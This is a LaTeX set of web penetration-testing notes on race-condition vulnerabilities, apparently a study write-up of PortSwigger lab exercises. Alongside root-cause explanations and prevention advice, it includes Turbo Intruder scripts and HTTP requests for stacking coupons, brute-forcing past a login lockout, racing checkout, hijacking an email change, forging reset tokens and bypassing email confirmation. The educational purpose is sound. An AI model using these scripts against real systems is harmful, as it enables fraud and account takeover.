@@ -1,0 +1,515 @@
+\documentclass[11pt]{article}
+\usepackage[a4paper,margin=2cm]{geometry}
+\usepackage{fontspec}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{enumitem}
+\usepackage{amssymb}
+\usepackage{titlesec}
+\usepackage{hyperref}
+\usepackage{tcolorbox}
+\usepackage{fancyhdr}
+\tcbuselibrary{breakable,skins}
+ 
+\setmainfont{DejaVu Serif}
+\setmonofont{DejaVu Sans Mono}
+ 
+\definecolor{codebg}{RGB}{245,245,245}
+\definecolor{httpblue}{RGB}{20,60,110}
+\definecolor{causeorange}{RGB}{180,80,0}
+ 
+\lstdefinestyle{http}{
+  backgroundcolor=\color{codebg},
+  basicstyle=\ttfamily\small,
+  breaklines=true,
+  frame=single,
+  rulecolor=\color{gray},
+  columns=fullflexible,
+  keepspaces=true
+}
+\lstdefinestyle{code}{
+  backgroundcolor=\color{codebg},
+  basicstyle=\ttfamily\small,
+  breaklines=true,
+  frame=single,
+  rulecolor=\color{gray},
+  columns=fullflexible,
+  language=Python,
+  keywordstyle=\color{blue},
+  commentstyle=\color{gray}
+}
+
+
+\titleformat{\section}{\Large\bfseries\color{httpblue}}{\thesection}{1em}{}
+\titleformat{\subsection}{\large\bfseries}{\thesubsection}{1em}{}
+\titleformat{\subsubsection}{\normalsize\bfseries\itshape}{\thesubsubsection}{1em}{}
+
+\newtcolorbox{causebox}{
+  breakable, colback=orange!5, colframe=causeorange, title={Root Cause (Programming Perspective)},
+  fonttitle=\bfseries, boxrule=0.8pt
+}
+\newtcolorbox{labbox}[1]{
+  breakable, colback=blue!4, colframe=httpblue, title={#1},
+  fonttitle=\bfseries, boxrule=0.8pt
+}
+ 
+\setlength{\headheight}{14pt}
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{Race Condition Vulnerabilities}
+\fancyhead[R]{\thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+ 
+
+\title{\textbf{Race Condition Vulnerabilities}\\\large Web Application Penetration Testing Notes}
+\author{Eyad Islam El-Taher}
+\date{}
+
+\begin{document}
+\maketitle
+\tableofcontents
+\newpage
+
+\section{Introduction}
+\begin{itemize}[leftmargin=1.2em]
+  \item A race condition happens when a process depends critically on the \textbf{timing or ordering} of other concurrent events, and that dependency is not properly controlled.
+  \item Web servers routinely process multiple HTTP requests at the same time. If the application (or the framework/language underneath it) does not synchronize access to a shared resource -- a database row, a session variable, a file, a counter -- an attacker can send several requests \textbf{at almost the same instant} and force the server into an unintended state.
+  \item These are classic \textbf{TOCTOU} (Time-Of-Check to Time-Of-Use) bugs: the server \emph{checks} a condition (``has this coupon been used?''), then later \emph{acts} on it (``apply the coupon''). Between the check and the act there is a \textbf{race window} -- and that window is the attack surface.
+  \item Automated scanners almost never find these bugs, because there is no payload to fuzz and no signature to match; they only show up when requests are timed correctly.
+\end{itemize}
+
+\section{Tools}
+\begin{itemize}[leftmargin=1.2em]
+  \item \textbf{Burp Suite Repeater (2023.9+)} -- native support for sending a \textit{group} of requests in parallel, either in sequence (one connection, warmed) or truly in parallel (last-byte sync / single-packet).
+  \item \textbf{PortSwigger/turbo-intruder} -- Burp extension for firing large volumes of finely-timed requests; scriptable in Python (Jython), gives full control over connections, gating, and timing.
+\end{itemize}
+
+
+
+
+\section{Mindset for Finding Race Conditions}
+\begin{itemize}[leftmargin=1.2em]
+  \item Stop thinking in terms of ``one request, one response.'' Every endpoint that touches shared state is really asking: \textit{what happens if this exact code path runs twice, at the same instant, for the same record?}
+  \item Assume every \textbf{check-then-act} pattern is broken until proven otherwise. Any place the application reads a value, makes a decision, and only later writes the updated value is a candidate -- balances, counters, flags, tokens, session variables, cart contents.
+  \item Think in terms of \textbf{sub-states}, not just start/end state. A single HTTP request often walks the application through several hidden internal states before the response is returned (e.g. ``payment validated'' $\rightarrow$ ``order confirmed'' are two different moments even though the client only sees one request/response pair). The gap between sub-states is where the vulnerability lives, whether it is exposed by one request repeated, or by a second request/endpoint fired into the gap.
+  \item Ask, for every sensitive action: \textit{is this single-use, rate-limited, balance-checked, or one-time by design?} If yes, that restriction is enforced by \emph{some} piece of shared state somewhere, and shared state is exactly what races attack.
+  \item Remember that timing bugs do not require a classic two-writes race at all -- sometimes the ``race'' is just about hitting a narrow window created by asynchronous side effects (e.g. an email is sent on a background thread after the HTTP response already returned, so a confirmation link may be usable before the corresponding email finishes generating, or vice versa).
+  \item Do not stop at single-endpoint thinking. Two completely different endpoints that touch the same underlying record (cart + checkout, email-change + email-confirm, invite + register) can race each other just as easily as the same endpoint racing itself.
+  \item Expect apparent ``it's fixed'' responses (e.g. \texttt{Forbidden} for an empty parameter) to sometimes just mean the \emph{obvious} bypass was patched -- keep probing for equivalent-but-different ways to express the same edge-case value (null, empty array, empty string, missing key).
+\end{itemize}
+ 
+\section{How to Find and Test}
+This follows the methodology summarized from PortSwigger Research's whitepaper \textit{Smashing the State Machine}: predict, probe, then prove.
+ 
+\subsection{Step 1 -- Predict Potential Collisions}
+\begin{itemize}[leftmargin=1.2em]
+  \item Map the whole application first, as normal. Testing every endpoint for races is impractical, so narrow the list by asking:
+  \begin{itemize}
+    \item \textbf{Is this endpoint security-critical?} Endpoints with no real security/business impact are not worth racing.
+    \item \textbf{Is there collision potential?} You need two or more requests that operate on the \emph{same} underlying record. Two parallel password resets for two different users rarely collide because they touch two different rows; two parallel resets for the same user, or a shared session, are far more promising.
+  \end{itemize}
+  \item Prioritize: coupons/discounts, gift cards and balances, login/2FA/OTP attempts, password reset and email-change/verification flows, invite/registration systems, any ``one-time'' action, and multi-step checkouts.
+\end{itemize}
+ 
+\subsection{Step 2 -- Probe for Clues}
+\begin{itemize}[leftmargin=1.2em]
+  \item Perform the action normally once and note the exact response, timing, and any tokens/values returned.
+  \item Repeat the action and compare: does the token/value change each time (suggesting some internal state like an RNG, counter, or timestamp)? Is the length constant (suggesting a fixed-format hash or ID)?
+  \item Send the request twice in Repeater, sequentially, and note response times. If every response is delayed and serialized even under a parallel send, suspect a \textbf{session-based locking mechanism} (e.g. PHP's native session handler processes one request per session at a time) masking the actual race -- retest using two separate sessions.
+  \item Try malformed/edge-case parameter values on any token-comparison endpoint: missing parameter, empty string, empty array (\texttt{param[]=}), null-equivalent values. Different error messages for each (\texttt{Missing parameter} vs \texttt{Incorrect token} vs \texttt{Forbidden}) reveal how the comparison is implemented and whether an uninitialized/NULL sub-state might be reachable.
+  \item Benchmark relative response times between the two requests you plan to race (e.g. confirm vs register). If one is consistently much faster, you will need a deliberate client-side delay so the fast request lands \emph{inside} the slow request's race window rather than resolving before it.
+\end{itemize}
+ 
+\subsection{Step 3 -- Prove the Concept}
+\begin{itemize}[leftmargin=1.2em]
+  \item Choose the right technique: last-byte synchronization for HTTP/1.1, single-packet attack for HTTP/2, or a Turbo Intruder script with explicit \texttt{gate} control when you need mixed/asymmetric requests or a controlled delay.
+  \item Start with \textasciitilde20 parallel requests. If nothing happens, try reordering requests within the group (e.g. 1,2,3 vs 1,3,2), warming the connection with a throwaway request first, or introducing a small artificial delay on the faster request.
+  \item If timing is inconsistent on a given target, check whether rate/resource limiting is unintentionally helping you: intentionally triggering a server-side rate limit with dummy requests can introduce just enough delay to make the single-packet attack viable even when precise delayed execution is required.
+  \item Confirm the result out-of-band where possible (check an inbox, refresh a cart, recheck a balance) rather than relying solely on HTTP status codes, since a collision does not always produce an obviously different response.
+  \item Iterate. Race conditions rarely land on the first attempt -- expect to repeat the burst multiple times, especially for narrow windows like partial-construction bugs.
+\end{itemize}
+ 
+
+
+\section{Methodology}
+
+\subsection{Limit-Overrun}
+\begin{itemize}[leftmargin=1.2em]
+  \item Occurs when multiple concurrent requests compete to read-then-write a shared counter or flag, and the check happens before the update is committed, so several requests all pass the check simultaneously.
+  \item \textbf{Typical impact:} redeeming a one-time discount/gift-card multiple times, registering more users than an invite allows, overdrawing an account balance, reusing a single-use CAPTCHA solution.
+\end{itemize}
+\begin{causebox}
+The endpoint logic is written sequentially, e.g.:
+\begin{lstlisting}[style=code]
+if not code.used:
+    apply_discount(order)
+    code.used = True   # DB write happens AFTER the discount is applied
+\end{lstlisting}
+If 20 requests reach \texttt{if not code.used} before any of them reaches the write, all 20 see \texttt{used = False} and all 20 apply the discount. The developer assumed requests are processed one at a time; the framework/webserver processes them concurrently across threads or worker processes, and no lock/transaction wraps the check-and-set as one atomic unit.
+\end{causebox}
+
+\subsection{Rate-Limit Bypass}
+\begin{itemize}[leftmargin=1.2em]
+  \item Rate limiting (anti-brute-force, anti-spam, 2FA attempt limits) is itself just a counter with a threshold -- so it is subject to the exact same TOCTOU flaw as limit-overrun.
+  \item If the ``check attempts remaining'' and ``increment attempt counter'' steps are not atomic, an attacker can fire many login/2FA attempts in one burst; every one of them reads the counter \emph{before} any of them increments it, so the lockout threshold is never observed.
+\end{itemize}
+\begin{causebox}
+\begin{lstlisting}[style=code]
+attempts = get_failed_attempts(username)   # read
+if attempts >= 3:
+    return "Account locked"
+verify_password(username, password)        # slow: DB/hash compare
+increment_failed_attempts(username)        # write, happens last
+\end{lstlisting}
+The counter is stored and updated \textbf{per-username}, not per-request-in-flight, and the increment is deferred until after the (comparatively slow) password check. Sending N parallel requests means all N reads happen before the first write lands, so the effective limit becomes ``N requests per race window'' instead of ``3 attempts total''.
+\end{causebox}
+
+\section{Techniques for Timing Requests}
+
+\subsection{HTTP/1.1 Last-Byte Synchronization}
+\begin{itemize}[leftmargin=1.2em]
+  \item Send every request in the group \textbf{except the final byte}, holding each connection open with all requests parked mid-stream.
+  \item Then release (send) the last byte of every request back-to-back. All requests complete and reach the application layer within microseconds of each other, eliminating most network jitter.
+\end{itemize}
+\begin{lstlisting}[style=code]
+engine.queue(request, gate='race1')
+engine.openGate('race1')   # releases the withheld final bytes together
+\end{lstlisting}
+
+\subsection{HTTP/2 Single-Packet Attack}
+\begin{itemize}[leftmargin=1.2em]
+  \item HTTP/2 multiplexes several requests over one TCP connection. By stuffing \textasciitilde20--30 complete requests into a single TCP packet, they all arrive at the server in the same instant -- removing network jitter entirely, since there is only one packet to be delayed or reordered.
+  \item In Burp: send the request to Repeater, duplicate it 20 times (\texttt{CTRL+R}), group all the tabs, then use \textit{Send group in parallel (single-packet attack)}.
+\end{itemize}
+
+\section{Turbo Intruder Templates}
+
+\subsection{Example 1 -- Classic Race (single request repeated)}
+\begin{lstlisting}[style=code]
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=30,
+                            requestsPerConnection=30,
+                            pipeline=False)
+    for i in range(30):
+        engine.queue(target.req, i)
+        engine.queue(target.req, target.baseInput, gate='race1')
+    engine.start(timeout=5)
+    engine.openGate('race1')
+    engine.complete(timeout=60)
+
+def handleResponse(req, interesting):
+    table.add(req)
+\end{lstlisting}
+\begin{itemize}[leftmargin=1.2em]
+  \item Set the external HTTP header \texttt{x-request: \%s} before running -- this is required internally by Turbo Intruder for payload substitution.
+\end{itemize}
+
+\subsection{Example 2 -- Two Different Requests Racing Each Other}
+\begin{itemize}[leftmargin=1.2em]
+  \item Useful when \texttt{request2} must land \emph{immediately} after \texttt{request1}, with only a few milliseconds of race window between them (e.g. multi-endpoint races).
+\end{itemize}
+\begin{lstlisting}[style=code]
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=30,
+                            requestsPerConnection=100,
+                            pipeline=False)
+    request1 = '''
+POST /target-URI-1 HTTP/1.1
+Host: <REDACTED>
+Cookie: session=<REDACTED>
+
+parameterName=parameterValue
+    '''
+    request2 = '''
+GET /target-URI-2 HTTP/1.1
+Host: <REDACTED>
+Cookie: session=<REDACTED>
+    '''
+    engine.queue(request1, gate='race1')
+    for i in range(30):
+        engine.queue(request2, gate='race1')
+    engine.openGate('race1')
+    engine.complete(timeout=60)
+
+def handleResponse(req, interesting):
+    table.add(req)
+\end{lstlisting}
+
+\newpage
+\section{Lab Walkthroughs}
+
+Each lab below follows the same pattern: understand the flow $\rightarrow$ identify the race window $\rightarrow$ fire synchronized requests $\rightarrow$ confirm exploitation. The \textbf{Root Cause} box at the end of each lab explains \emph{why}, from a programming standpoint, the bug exists.
+
+% ---------------------------------------------------------
+\subsection{Lab 1: Limit Overrun Race Conditions}
+\begin{labbox}{Goal}
+Purchase a \$1337.00 Lightweight L33t Leather Jacket using only \$50 of store credit, by stacking a 20\%-off single-use discount code multiple times.
+\end{labbox}
+\begin{enumerate}[leftmargin=1.2em]
+  \item Log in (\texttt{wiener:peter}), add the leather jacket to the cart, apply promo code \texttt{PROMO20}, and try to check out -- it fails because \$1069.60 still exceeds the \$50 balance.
+  \item Remove the jacket, add a cheap item instead, and study the \texttt{POST /cart/coupon} request that applies the code.
+  \item Send \texttt{POST /cart/coupon} to Repeater, duplicate it into a group of \textasciitilde20 tabs, and send the group \textbf{in parallel} (single-packet attack if HTTP/2 is supported).
+  \item Refresh the cart in the browser: the 20\% discount has been applied more than once, since several requests all read ``coupon not yet used'' before the first one finished marking it as used.
+  \item Remove the discount stacking artifacts, add the leather jacket back to the cart, and repeat the parallel \texttt{POST /cart/coupon} burst until the discounted total drops under \$50.
+  \item Purchase the jacket to solve the lab.
+\end{enumerate}
+\begin{lstlisting}[style=http]
+POST /cart/coupon HTTP/2
+Host: 0a...web-security-academy.net
+Cookie: session=<SESSION>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 20
+
+csrf=<TOKEN>&coupon=PROMO20
+\end{lstlisting}
+\begin{causebox}
+The coupon-application logic performs \texttt{check-then-act} without a lock or atomic DB transaction:
+\begin{lstlisting}[style=code]
+if not session.coupon_applied:
+    order.total *= 0.8
+    session.coupon_applied = True
+\end{lstlisting}
+Sending 20 requests inside the same race window means all 20 execute \texttt{if not session.coupon\_applied} while it is still \texttt{False}, so the 20\% reduction is applied repeatedly before the flag is finally persisted.
+\end{causebox}
+
+% ---------------------------------------------------------
+\subsection{Lab 2: Bypassing Rate Limits via Race Conditions}
+\begin{labbox}{Goal}
+Brute-force \texttt{carlos}'s password despite a rate limiter that locks the account after 3 failed attempts.
+\end{labbox}
+\begin{enumerate}[leftmargin=1.2em]
+  \item Submit wrong passwords for \texttt{wiener} and confirm you get locked out after 3 attempts (\texttt{You have made too many incorrect login attempts}).
+  \item Test with another username and see a plain \texttt{Invalid username or password} instead -- the limit is enforced \textbf{per-username}, meaning the failed-attempt counter is stored server-side keyed by username.
+  \item Send \texttt{POST /login} to Turbo Intruder using template \texttt{race-single-packet-attack.py}, set \texttt{username=carlos} and mark \texttt{password=\%s} as the payload position.
+  \item Load the supplied password wordlist and fire the single-packet attack (needs Burp 2023.9+ and the latest Turbo Intruder).
+  \item Because all password attempts land inside one race window, the lockout counter never gets the chance to reach 3 before every guess has already been checked -- watch for a \texttt{302} response indicating a successful login.
+  \item Log in as \texttt{carlos}, open the admin panel, delete the user \texttt{carlos} to solve the lab.
+\end{enumerate}
+\begin{lstlisting}[style=code]
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=1,
+                            engine=Engine.BURP2)   # single-packet attack
+    for word in open('/path/to/passwords.txt'):
+        engine.queue(target.req, word.rstrip(), gate='race1')
+    engine.openGate('race1')
+
+def handleResponse(req, interesting):
+    table.add(req)
+\end{lstlisting}
+\begin{causebox}
+\begin{lstlisting}[style=code]
+attempts = db.get_failed_attempts(username)   # read (shared state)
+if attempts >= 3:
+    abort(429)
+ok = check_password(username, password)       # slow, bcrypt/hash compare
+if not ok:
+    db.increment_failed_attempts(username)    # write, deferred until AFTER the check
+\end{lstlisting}
+The increment only happens after the (relatively expensive) password comparison finishes. Sending dozens of requests at once means they all read the same pre-increment counter value, so the effective number of guesses per lockout window is far higher than the intended limit of 3 -- the check and the increment are not wrapped in one atomic operation.
+\end{causebox}
+
+% ---------------------------------------------------------
+\subsection{Lab 3: Multi-Endpoint Race Conditions}
+\begin{labbox}{Goal}
+Purchase the Lightweight L33t Leather Jacket by racing \emph{two different endpoints} (add-to-cart and checkout) against each other, not the same endpoint repeatedly.
+\end{labbox}
+\begin{enumerate}[leftmargin=1.2em]
+  \item Purchase a cheap gift card first to observe the normal checkout flow: \texttt{POST /cart} (add item) $\rightarrow$ \texttt{POST /cart/checkout} (validate balance and finalize order).
+  \item Notice that checkout is not instantaneous -- there is a short window between when the server validates that you have enough balance and when it actually finalizes/clears the cart.
+  \item Build two Repeater groups: \textbf{Group A} = \texttt{POST /cart} with the gift-card product (to keep balance topped up) and a checkout request; \textbf{Group B} = \texttt{POST /cart} adding the leather jacket, then a checkout request for it.
+  \item Send both groups in parallel repeatedly (warm the connection first, or use Turbo Intruder's single-packet attack across the two endpoints) so that the jacket gets added to the cart \emph{during} the race window between balance-check and order-finalization of another in-flight checkout.
+  \item Keep retrying, checking the response/cart state after each burst, until the jacket purchase succeeds despite insufficient funds.
+\end{enumerate}
+\begin{lstlisting}[style=http]
+POST /cart HTTP/2
+Host: 0a...web-security-academy.net
+Cookie: session=<SESSION>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+
+csrf=<TOKEN>&productId=1&redir=CART
+---
+POST /cart/checkout HTTP/2
+Host: 0a...web-security-academy.net
+Cookie: session=<SESSION>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+csrf=<TOKEN>
+\end{lstlisting}
+\begin{causebox}
+The order state machine transitions through a hidden sub-state:
+\begin{lstlisting}[style=code]
+if cart.total <= user.balance:      # validation step (time T0)
+    # --- race window: cart is still mutable here ---
+    finalize_order(cart)            # commit step (time T0 + delta)
+\end{lstlisting}
+Because validation and finalization are two separate steps (sometimes even two separate HTTP requests), the cart can legally be mutated \emph{after} the balance check passed but \emph{before} the order is actually confirmed. Any item added during that gap rides along into the finalized order without ever being balance-checked itself.
+\end{causebox}
+
+% ---------------------------------------------------------
+\subsection{Lab 4: Single-Endpoint Race Conditions}
+\begin{labbox}{Goal}
+Change your own account's email address to \texttt{carlos@ginandjuice.shop} by racing two \emph{parallel} requests to the \textbf{same} email-change endpoint with different parameter values.
+\end{labbox}
+\begin{enumerate}[leftmargin=1.2em]
+  \item Study the email-change feature: submitting a new address sends a confirmation link to that address; only after clicking it does the change take effect.
+  \item Send the \texttt{POST /my-account/change-email} request to Repeater, duplicate it, and change the email value in each copy (e.g. one to \texttt{wiener1@...}, the other to \texttt{wiener2@...}) to observe how the backend session state is updated.
+  \item Group both requests and send them \textbf{in parallel}; because both racing requests share the same session, the underlying session variable (e.g. \texttt{session['pending-email']}) can end up holding one value while the confirmation token generated is associated with the other, if the write order interleaves incorrectly.
+  \item Apply this to the actual attack: race a change to your own decoy address in parallel with a change to \texttt{carlos@ginandjuice.shop}; when the two requests interleave favorably, the session ends up in a state where the confirmation link you legitimately receive actually confirms the \texttt{carlos@ginandjuice.shop} address.
+  \item Click the confirmation link received in your inbox; your account email is now \texttt{carlos@ginandjuice.shop}.
+  \item Access the admin panel and delete the user \texttt{carlos} to solve the lab.
+\end{enumerate}
+\begin{lstlisting}[style=http]
+POST /my-account/change-email HTTP/2
+Host: 0a...web-security-academy.net
+Cookie: session=<SESSION>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 45
+
+csrf=<TOKEN>&email=carlos@ginandjuice.shop
+\end{lstlisting}
+\begin{causebox}
+Consider the pseudo-code, where session state is shared mutable storage racing between two requests on the same session:
+\begin{lstlisting}[style=code]
+session['pending_email'] = new_email     # write 1 (request A)
+session['pending_email'] = new_email     # write 1 (request B, races A)
+send_confirmation(session['pending_email'])   # read happens once, non-deterministic which write "won"
+\end{lstlisting}
+Because both requests operate on the \emph{same} session-scoped variable with no locking, the final value of \texttt{pending\_email} depends purely on which write executed last -- yet the confirmation token/email pairing may already have captured the other request's data, producing a mismatch the attacker can exploit to confirm an address they never legitimately submitted last.
+\end{causebox}
+
+% ---------------------------------------------------------
+\subsection{Lab 5: Exploiting Time-Sensitive Vulnerabilities}
+\begin{labbox}{Goal}
+This lab has no race condition per se -- the password-reset token is generated from a predictable hash (including a timestamp), so carefully timed requests let you forge a token for \texttt{carlos}.
+\end{labbox}
+\textbf{Study the behavior}
+\begin{enumerate}[leftmargin=1.2em]
+  \item Trigger your own password reset and observe the emailed link contains \texttt{username} and \texttt{token} query parameters.
+  \item Send \texttt{POST /forgot-password} to Repeater and fire it a few times; every reset produces a token of the \emph{same length} but a \emph{different value} -- consistent with a hash that has some varying internal input (RNG, counter, or timestamp).
+  \item Group and parallel-send two reset requests; observe the responses are still noticeably delayed relative to each other, meaning per-session request locking (see below) is still serializing them.
+\end{enumerate}
+\textbf{Bypass per-session locking}
+\begin{enumerate}[leftmargin=1.2em]
+  \item Notice the session cookie implies a PHP backend -- PHP's native session handler processes only one request at a time \emph{per session}, which is exactly the serialization observed above.
+  \item Send \texttt{GET /forgot-password} with the session cookie stripped, to obtain a brand-new session and CSRF token.
+  \item Swap that fresh session/CSRF pair into one of the two \texttt{POST /forgot-password} requests, so the pair now runs under \textbf{two different sessions} -- removing the artificial serialization.
+  \item Resend the pair in parallel: response times are now closely aligned or identical, confirming the requests are truly concurrent.
+\end{enumerate}
+\textbf{Confirm and exploit}
+\begin{enumerate}[leftmargin=1.2em]
+  \item When both response times match, both confirmation emails contain the \textbf{same token} -- proving a timestamp (not a secure random value) feeds the hash.
+  \item Since the \texttt{username} is a separate parameter from the hash inputs, two different usernames can share one token if their requests land in the same timing bucket.
+  \item In the two-session request pair, set one request's \texttt{username=carlos}, then resend both in parallel.
+  \item Only one new confirmation email arrives in your inbox -- the other (matching) token was mailed to \texttt{carlos}.
+  \item Take the link from your own email, edit the \texttt{username} query parameter to \texttt{carlos}, and submit a new password.
+  \item Log in as \texttt{carlos} with that password (retry the whole race if the token in your inbox did not match), then delete the user via the admin panel.
+\end{enumerate}
+\begin{lstlisting}[style=http]
+GET /forgot-password HTTP/1.1
+Host: 0a...web-security-academy.net
+(no Cookie header -- forces a new session)
+---
+POST /forgot-password HTTP/1.1
+Host: 0a...web-security-academy.net
+Cookie: session=<FRESH-SESSION>
+Content-Type: application/x-www-form-urlencoded
+
+csrf=<FRESH-TOKEN>&username=carlos
+\end{lstlisting}
+\begin{causebox}
+\begin{lstlisting}[style=code]
+token = md5(username_secret_salt + str(time.time()))
+\end{lstlisting}
+The token generation relies on a \textbf{high-resolution timestamp} instead of a cryptographically secure random value. If two reset requests are processed at the exact same server-side timestamp (achievable by racing them under separate sessions to dodge PHP's per-session request lock), they hash to an identical token regardless of which username triggered them -- because the username is not actually part of the hash input, only appended as a separate, unauthenticated query parameter afterward.
+\end{causebox}
+
+% ---------------------------------------------------------
+\subsection{Lab 6: Partial Construction Race Conditions}
+\begin{labbox}{Goal}
+Bypass email verification during registration and create an account under an arbitrary, unowned \texttt{@ginandjuice.shop} address by exploiting the moment \emph{between} when a user row is created and when its confirmation token is actually stored.
+\end{labbox}
+\begin{enumerate}[leftmargin=1.2em]
+  \item Study \texttt{POST /register}: it accepts \texttt{csrf}, \texttt{username}, \texttt{email}, \texttt{password} and only allows \texttt{@ginandjuice.shop} addresses; a confirmation email is required to activate the account.
+  \item Inspect the client-side script \texttt{/resources/static/users.js}: it shows the confirmation button submits \texttt{POST /confirm?token=<TOKEN>}.
+  \item Probe \texttt{POST /confirm} directly:
+    \begin{itemize}
+      \item an arbitrary token $\rightarrow$ \texttt{Incorrect token: <TOKEN>}
+      \item no token parameter at all $\rightarrow$ \texttt{Missing parameter: token}
+      \item an empty token \texttt{token=} $\rightarrow$ \texttt{Forbidden} (suggests this exact bypass was already patched for the trivial empty-string case)
+      \item an empty \textbf{array} \texttt{token[]=} $\rightarrow$ \texttt{Incorrect token: Array} -- meaning the value was accepted as an equivalent of \texttt{null}/uninitialized rather than being rejected outright.
+    \end{itemize}
+  \item Reason about the timeline: the registration handler must (a) insert the pending user row, then (b) generate and store its confirmation token -- these are two separate writes. Between them, the token column may briefly be \texttt{NULL}, and \texttt{token[]=} may successfully match that \texttt{NULL}/uninitialized state if you land \texttt{POST /confirm} inside that exact gap.
+  \item Benchmark timing: confirm that \texttt{POST /confirm} responses come back much faster than \texttt{POST /register} responses -- meaning a single, un-delayed confirmation request will always resolve \emph{before} the matching registration finishes, missing the window.
+  \item Send \texttt{POST /register} to Turbo Intruder using the \texttt{race-single-packet-attack.py} template; mark the \texttt{username} value as the payload position (\texttt{\%s}), set \texttt{email} to a not-yet-used \texttt{@ginandjuice.shop} address, and add a deliberate client-side delay so the confirmation floods land squarely inside the registration's race window while many different usernames are being registered.
+  \item In parallel/alongside, flood \texttt{POST /confirm?token[]=} attempts against the usernames being registered.
+  \item Watch for a \texttt{200} response containing \texttt{Account registration for user <USERNAME> successful} -- note that username.
+  \item Log in with that username and the static password used during registration; the account is verified despite never owning the confirmation inbox.
+  \item Access the admin panel and delete \texttt{carlos} to solve the lab.
+\end{enumerate}
+\begin{lstlisting}[style=http]
+POST /register HTTP/2
+Host: 0a...web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 74
+
+csrf=<TOKEN>&username=%s&email=attacker@exploit-server.net&password=test1234
+---
+POST /confirm?token[]= HTTP/2
+Host: 0a...web-security-academy.net
+Content-Length: 0
+\end{lstlisting}
+\begin{causebox}
+The account object is built across \textbf{two sequential writes}, exposing a genuine sub-state:
+\begin{lstlisting}[style=code]
+user = db.insert_user(username, email, password)   # write 1: row exists, token column NULL
+token = generate_token()
+db.update_user_token(user.id, token)                # write 2: token finally set
+\end{lstlisting}
+Between write 1 and write 2 the token column is \texttt{NULL}. The \texttt{/confirm} endpoint's comparison likely reads as \texttt{submitted\_token == stored\_token}; PHP-style loose/type-juggling comparisons (or a naive array-vs-null comparison) can make an \emph{array} submitted as \texttt{token[]=} evaluate as equal to an uninitialized/\texttt{NULL} stored token. Landing the confirmation request inside that narrow gap confirms the account without ever knowing the real token -- the developer never anticipated that the object could be read mid-construction.
+\end{causebox}
+
+
+\section{Checklist}
+\begin{itemize}[leftmargin=1.2em]
+  \item[$\square$] Identify every endpoint that is single-use, rate-limited, balance-checked, or otherwise restricted by shared state.
+  \item[$\square$] For each, ask: does the check happen strictly before the write, with no lock/transaction wrapping both?
+  \item[$\square$] Test the single endpoint repeated in parallel (limit-overrun / rate-limit bypass pattern).
+  \item[$\square$] Test pairs of \emph{different} endpoints that touch the same record (multi-endpoint pattern) -- e.g. add-to-cart vs checkout, invite vs register.
+  \item[$\square$] Test the same endpoint with two different parameter values in parallel, under the same session (single-endpoint pattern) -- e.g. email-change, password reset.
+  \item[$\square$] Check whether session-based request locking (PHP-style) is masking a real race; retest across two separate sessions if response timings look serialized.
+  \item[$\square$] Fuzz token-comparison endpoints with missing / empty / empty-array / null-equivalent parameter values to look for partial-construction sub-states.
+  \item[$\square$] Check whether security tokens are derived from timestamps or other guessable/shared inputs rather than a CSPRNG.
+  \item[$\square$] Benchmark relative response times between racing requests and add deliberate delay to the faster one if needed.
+  \item[$\square$] Confirm HTTP/1.1 vs HTTP/2 support to choose last-byte sync vs single-packet attack.
+  \item[$\square$] Verify results out-of-band (inbox, cart state, balance, admin panel) rather than trusting status codes alone.
+  \item[$\square$] Retry with reordered request sequencing and connection warming if an initial burst produces no collision.
+\end{itemize}
+ 
+\section{Preventing Race Conditions}
+\begin{itemize}[leftmargin=1.2em]
+  \item \textbf{Atomic check-and-act.} Wrap the read, decision, and write in a single database transaction (or use atomic operations like \texttt{UPDATE ... WHERE used = false} that succeed only once) so no other request can observe the pre-write state.
+  \item \textbf{Row-level or resource-level locking.} Use \texttt{SELECT ... FOR UPDATE} around the critical section so concurrent requests touching the same record are serialized at the database, not left to the application's timing.
+  \item \textbf{Idempotency keys / unique constraints.} Enforce single-use behavior with a unique database constraint (e.g. a unique index on \texttt{coupon\_id + user\_id}) so a second concurrent insert fails outright rather than silently succeeding twice.
+  \item \textbf{Avoid session-level ambiguity.} Do not let two logically distinct operations (e.g. two different pending email changes) share one mutable session variable without correlating it to a request-specific identifier or token.
+  \item \textbf{Generate tokens with a CSPRNG, never from timestamps or predictable counters.} Reset/confirmation tokens must not be derivable or collide when requests happen to land in the same time bucket.
+  \item \textbf{Rate-limit at the infrastructure layer too.} Combine application-level counters with a WAF/gateway-level rate limiter that is not subject to the same per-request check-then-act flaw as the application code.
+  \item \textbf{Design multi-step workflows to avoid mutable sub-states.} Validate and finalize an object construction (registration, checkout, order) in one atomic operation rather than exposing a window where the object exists but is not yet fully initialized or fully confirmed.
+\end{itemize}
+
+
+\section{References}
+\begin{itemize}[leftmargin=1.2em]
+  \item PortSwigger Web Security Academy -- \url{https://portswigger.net/web-security/race-conditions}
+  \item PortSwigger Research -- \textit{Smashing the State Machine: The True Potential of Web Race Conditions}, James Kettle, Black Hat USA 2023.
+  \item PayloadsAllTheThings -- Race Condition, \url{https://github.com/swisskyrepo/PayloadsAllTheThings}
+  \item PortSwigger/turbo-intruder -- \url{https://github.com/PortSwigger/turbo-intruder}
+  \item Josip Franjkovic, \textit{Race conditions on the web} (2016).
+  \item Laxman Muthiyah, \textit{Instagram Password Reset Mechanism Race Condition}.
+\end{itemize}
+
+\end{document}
